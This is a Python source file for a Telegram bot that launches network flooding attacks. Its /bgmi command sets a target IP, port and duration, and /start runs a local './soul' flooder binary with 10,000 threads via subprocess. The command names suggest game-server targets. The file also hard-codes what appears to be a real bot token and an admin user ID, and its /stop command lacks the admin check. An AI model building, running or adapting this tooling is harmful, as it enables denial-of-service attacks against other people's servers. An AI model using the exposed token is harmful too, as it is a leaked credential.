import subprocess
import string
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Insert your Telegram bot token here
BOT_TOKEN = '7596392885:AAEWlLXYYfl5FZG1Q89v9ku-71VvAc64Dsc'
 
# Admin user IDs
ADMIN_IDS = {"5738170480"}



flooding_process = None
flooding_command = None


DEFAULT_THREADS = 10000



async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooding_command
    user_id = str(update.message.from_user.id)


    if len(context.args) != 3:
        await update.message.reply_text('Usage: /soul <target_ip> <port> <duration>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['./soul', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in ADMIN_IDS:
        return

    if flooding_process is not None:
        await update.message.reply_text('Flooding is already running.')
        return

    if flooding_command is None:
        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text('Started flooding.')


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    if flooding_process is None:
        await update.message.reply_text('No flooding process is running.')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('Stopped flooding.')




def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))

    application.run_polling()

if __name__ == '__main__':
    main()
